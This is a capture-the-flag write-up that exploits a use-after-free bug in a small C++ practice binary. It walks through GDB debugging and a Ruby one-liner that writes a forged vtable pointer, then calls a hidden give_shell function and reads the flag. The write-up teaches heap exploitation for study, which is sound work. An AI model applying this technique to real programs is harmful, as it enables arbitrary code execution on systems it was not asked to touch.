# uaf Writeup

This challenge involves leveraging a Use After Free vulnerability to execute an unexpected function.
<details>
<summary> uaf.c </summary>
<p>
        
```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:

                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;       
}
```
</p>
</details>


# Discovery

## Source Code Analysis
We see that there is a class named `Human` with a `virtual` function `give_shell`. This is obviously our winner function. `Man` and `Woman` inherit `Human`. Two objects are crearted one `Man`, one `Woman`. The user is presented with a menu offering choices Use, After, and Free indexed by the numbers 1, 2, and 3 respectively. If the user uses 1, the program calls the `introduce` function for both the `Man` and the `Woman`. Option 2, After, will copy `argv[1]` bytes from the file at `argv[2]` into memory somewhere. Option 3 will delete the `Man` and `Woman` objects.

## Running the program
We can see what the source code says, let's try things out for real first to get an idea of what we are looking at.

### Use
```bash
uaf@ubuntu:~$ ./uaf
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
```

### Free then use
```bash
uaf@ubuntu:~$ ./uaf
1. use
2. after
3. free
3
1. use
2. after
3. free
1
Segmentation fault
```
Freeing causes use to crash!

Using **after** at any time it crashes because `argv[1]` does not exist and there is no checking on `argc`.

Let's try to use some arguments

The program takes two arguements, the first is how many bytes to read into memory, and the second is a file containing the bytes to be read.

```bash
uaf@ubuntu:~$ ruby -e "puts ?A*32" > /tmp/input.txt
uaf@ubuntu:~$ ./uaf 32 /tmp/input.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
Segmentation fault
uaf@ubuntu:~$ 
```
This time it doesn't crash on using option 2 until we use option 1 after 3.

Now that we have an idea of the basic program flow, let's dive into debugging the vulnerability.

## Debugging

### GDB

#### Setup
Each time we start up gdb for the first time, it will need you to use a couple of commands to demangle asm and C++ functions.

```bash
(gdb) set print asm-demangle on
(gdb) set print demangle on 
```

#### Information Gathering

```
(gdb) 
(gdb) info functions
All defined functions:

Non-debugging symbols:
<-- *********shortened for brevity********* -->
0x000000000040117a  Human::give_shell()
0x0000000000401192  Human::introduce()
0x0000000000401210  Human::Human()
0x0000000000401210  Human::Human()
0x000000000040123a  Human::~Human()
0x000000000040123a  Human::~Human()
0x0000000000401264  Man::Man(std::string, int)
0x0000000000401264  Man::Man(std::string, int)
0x00000000004012d2  Man::introduce()
0x0000000000401308  Woman::Woman(std::string, int)
0x0000000000401308  Woman::Woman(std::string, int)
0x0000000000401376  Woman::introduce()
<-- *********shortened for brevity********* -->
```
Let's set a breakpoint on `Man::introduce()` at `0x00000000004012d2`. This way we can see what happens before, and after we free. We know the program is going to crash on the line `m->introduce();`, we need to find that code. When we disassemble main, we won't see a function call listed for `Man::introduce()` this is because `Human::introduce()` is `virtual` meaning it can be overridden, and the function will be stored inside the class's vtable. This results in the code below out of the compiler.

```
(gdb) disas main
Dump of assembler code for function main:
<-- *********shortened for brevity********* -->
   0x0000000000400fcd <+265>:	mov    -0x38(%rbp),%rax
   0x0000000000400fd1 <+269>:	mov    (%rax),%rax
   0x0000000000400fd4 <+272>:	add    $0x8,%rax
   0x0000000000400fd8 <+276>:	mov    (%rax),%rdx
   0x0000000000400fdb <+279>:	mov    -0x38(%rbp),%rax
   0x0000000000400fdf <+283>:	mov    %rax,%rdi
   0x0000000000400fe2 <+286>:	callq  *%rdx
   0x0000000000400fe4 <+288>:	mov    -0x30(%rbp),%rax
   0x0000000000400fe8 <+292>:	mov    (%rax),%rax
   0x0000000000400feb <+295>:	add    $0x8,%rax
   0x0000000000400fef <+299>:	mov    (%rax),%rdx
   0x0000000000400ff2 <+302>:	mov    -0x30(%rbp),%rax
   0x0000000000400ff6 <+306>:	mov    %rax,%rdi
   0x0000000000400ff9 <+309>:	callq  *%rdx
<-- *********shortened for brevity********* -->
```
The idea is that if we set a breakpoint on `Man::introduce()` it will trigger the breakpoint only if the calling object hasn't been freed yet, otherwise it won't hit the breakpoint and we know the object has been overridden. Let's set up a couple of breakpoints.

```
(gdb) b *0x0000000000400fcd
Breakpoint 1 at 0x400fcd
(gdb) b *0x0000000000400fe2
Breakpoint 2 at 0x400fe2
(gdb) b *0x00000000004012d2
Breakpoint 3 at 0x4012d2
(gdb) 
```
So basically, 1 breaks at the beginning of the `m->introduce();` call, 2 breaks right before the call is made, and 3 breaks if the function `Man::introduce()` has been successfully called. Let's run.

```bash
(gdb) run
Starting program: /home/uaf/uaf 
1. use
2. after
3. free
1

Breakpoint 1, 0x0000000000400fcd in main ()
1: x/i $pc
=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400fe2 in main ()
1: x/i $pc
=> 0x400fe2 <main+286>:	callq  *%rdx
(gdb) c
Continuing.

Breakpoint 3, 0x00000000004012d2 in Man::introduce() ()
1: x/i $pc
=> 0x4012d2 <Man::introduce()>:	push   %rbp
(gdb) c
Continuing.
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
```
Ok so we haven't freed the object yet so we hit all three breakpoints, let's try freeing now.

```
1. use
2. after
3. free
3
1. use
2. after
3. free
1

Breakpoint 1, 0x0000000000400fcd in main ()
1: x/i $pc
=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400fd8 in main ()
1: x/i $pc
=> 0x400fd8 <main+276>:	mov    (%rax),%rdx
(gdb) 
```

Whoa! Shouldn't the 2nd breakpoint gotten hit? Instead it got a `SIGSEGV` at `0x400fd8`. Curious, lets try with some fuzzing data.

```
uaf@ubuntu:~$ ruby -e "100.times { |x| print (x+60).chr}; print ?\x0a" > /tmp/input.txt
(gdb) run 8 /tmp/input.txt
Starting program: /home/uaf/uaf 8 /tmp/input.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1

Breakpoint 1, 0x0000000000400fcd in main ()
1: x/i $pc
=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
2: /x $rax = 0x1
3: /x *$rax = <error: Cannot access memory at address 0x1>
4: /x $rdx = 0x7fff781e9ed8
5: /x *$rdx = 0x1
```
We hit the breakpoint, let's step one instruction.
```
(gdb) si
0x0000000000400fd1 in main ()
1: x/i $pc
=> 0x400fd1 <main+269>:	mov    (%rax),%rax
2: /x $rax = 0x2410c50
3: /x *$rax = 0x3f3e3d3c
4: /x $rdx = 0x7fff781e9ed8
5: /x *$rdx = 0x1
```
We see that the memory location `rax` points to is some of our fuzz data! 

```
(gdb) si
0x0000000000400fd4 in main ()
1: x/i $pc
=> 0x400fd4 <main+272>:	add    $0x8,%rax
2: /x $rax = 0x434241403f3e3d3c
3: /x *$rax = <error: Cannot access memory at address 0x434241403f3e3d3c>
4: /x $rdx = 0x7fff781e9ed8
5: /x *$rdx = 0x1
```
After the value at the location of `rax` is moved into `rax` and made into a QWORD. Now we can see we have quite a lot of sequential characters in rax, we now know we have 

```
(gdb) si
0x0000000000400fd8 in main ()
1: x/i $pc
=> 0x400fd8 <main+276>:	mov    (%rax),%rdx
2: /x $rax = 0x434241403f3e3d44
3: /x *$rax = <error: Cannot access memory at address 0x434241403f3e3d44>
4: /x $rdx = 0x7fff781e9ed8
5: /x *$rdx = 0x1
```
`0x8` was added to `rax`, we should take note of this as whatever value we want to get into `rdx` needs to have `0x8` subtracted from it.

```
(gdb) si

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400fd8 in main ()
1: x/i $pc
=> 0x400fd8 <main+276>:	mov    (%rax),%rdx
2: /x $rax = 0x434241403f3e3d44
3: /x *$rax = <error: Cannot access memory at address 0x434241403f3e3d44>
4: /x $rdx = 0x7fff781e9ed8
5: /x *$rdx = 0x1
(gdb) si

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) 
```
If we can supply `rax` with a valid function address, `rax` will be moved into `rdx` which will be the location that is jumped to in the `call *rdx` and we can get our win! We need to find some way to overwrite the pointer to `0x00000000004012d2 Man::introduce()` so when it's called after we free it will call `0x000000000040117a Human::give_shell()` When looking at what `rax` evaluates out to when changed into `char`, it starts at `60` which is where we started in our fuzz data. Therefore, all we need to do is write our 8 byte address-`0x8` to the file at `/tmp/input.txt` run uaf with `./uaf 8 /tmp/input.txt` and use options `3221`. Let's find our vtable entries.

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/uaf/uaf 
1. use
2. after
3. free
1

Breakpoint 1, 0x0000000000400fcd in main ()
1: x/i $pc
=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
2: /x $rax = 0x1
3: /x *$rax = <error: Cannot access memory at address 0x1>
4: /x $rdx = 0x7fff05ebb768
5: /x *$rdx = 0x1
(gdb) si
0x0000000000400fd1 in main ()
1: x/i $pc
=> 0x400fd1 <main+269>:	mov    (%rax),%rax
2: /x $rax = 0xccdc50
3: /x *$rax = 0x401570
4: /x $rdx = 0x7fff05ebb768
5: /x *$rdx = 0x1
```
We see `rax` is pointing to an address `0x00401570` Let's poke around at that address and see what we find.

```
(gdb) x/x *0x00401570
0x40117a <Human::give_shell()>:	0xe5894855
(gdb) Quit
(gdb) x/x 0x00401570
0x401570 <vtable for Man+16>:	0x0040117a
(gdb) 
```
So the vtable for `Man` is only 16 away from `give_shell`. We need to take the value for the vtable entry for `give_shell` minus `0x8` because the next instruction after this will add `0x8` and instead point to `Man::introduce()`, but we want `give_shell`. We take the address of `give_shell` `0x00401570` and subtract `0x8` `0x00401568`. Now we have our modified address to write into `m->introduce()`'s dereferenced pointer. 

Let's run one more time to make sure
```
uaf@ubuntu:~$ ruby -e "puts ?\x68 + ?\x15 + ?\x40 +( ?\x00*5)" > /tmp/input.txt
uaf@ubuntu:~$ gdb uaf

(gdb) b *0x0000000000400fcd
Breakpoint 1 at 0x400fcd

(gdb) run 8 /tmp/input.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/uaf/uaf 8 /tmp/input.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1

Breakpoint 1, 0x0000000000400fcd in main ()
1: x/i $pc
=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
2: /x $rax = 0x1
3: /x *$rax = <error: Cannot access memory at address 0x1>
4: /x $rdx = 0x7ffea4ef4818
5: /x *$rdx = 0x1
(gdb) si
0x0000000000400fd1 in main ()
1: x/i $pc
=> 0x400fd1 <main+269>:	mov    (%rax),%rax
2: /x $rax = 0xe06c50
3: /x *$rax = 0x401568
4: /x $rdx = 0x7ffea4ef4818
5: /x *$rdx = 0x1
(gdb) si
0x0000000000400fd4 in main ()
1: x/i $pc
=> 0x400fd4 <main+272>:	add    $0x8,%rax
2: /x $rax = 0x401568
3: /x *$rax = 0x4015d0
4: /x $rdx = 0x7ffea4ef4818
5: /x *$rdx = 0x1
(gdb) si
0x0000000000400fd8 in main ()
1: x/i $pc
=> 0x400fd8 <main+276>:	mov    (%rax),%rdx
2: /x $rax = 0x401570
3: /x *$rax = 0x40117a
4: /x $rdx = 0x7ffea4ef4818
5: /x *$rdx = 0x1
(gdb) si
0x0000000000400fdb in main ()
1: x/i $pc
=> 0x400fdb <main+279>:	mov    -0x38(%rbp),%rax
2: /x $rax = 0x401570
3: /x *$rax = 0x40117a
4: /x $rdx = 0x40117a
5: /x *$rdx = 0xe5894855
(gdb) si
0x0000000000400fdf in main ()
1: x/i $pc
=> 0x400fdf <main+283>:	mov    %rax,%rdi
2: /x $rax = 0xe06c50
3: /x *$rax = 0x401568
4: /x $rdx = 0x40117a
5: /x *$rdx = 0xe5894855
(gdb) si
0x0000000000400fe2 in main ()
1: x/i $pc
=> 0x400fe2 <main+286>:	callq  *%rdx
2: /x $rax = 0xe06c50
3: /x *$rax = 0x401568
4: /x $rdx = 0x40117a
5: /x *$rdx = 0xe5894855
(gdb) si
0x000000000040117a in Human::give_shell() ()
1: x/i $pc
=> 0x40117a <Human::give_shell()>:	push   %rbp
2: /x $rax = 0xe06c50
3: /x *$rax = 0x401568
4: /x $rdx = 0x40117a
5: /x *$rdx = 0xe5894855
```
We can see we are in `give_shell`! Let's run it for real now

## Solution
```
uaf@ubuntu:~$ ruby -e "puts ?\x68 + ?\x15 + ?\x40 +( ?\x00*5)" > /tmp/input.txt
uaf@ubuntu:~$ ./uaf 8 /tmp/input.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_<KEY>!
$ 

```



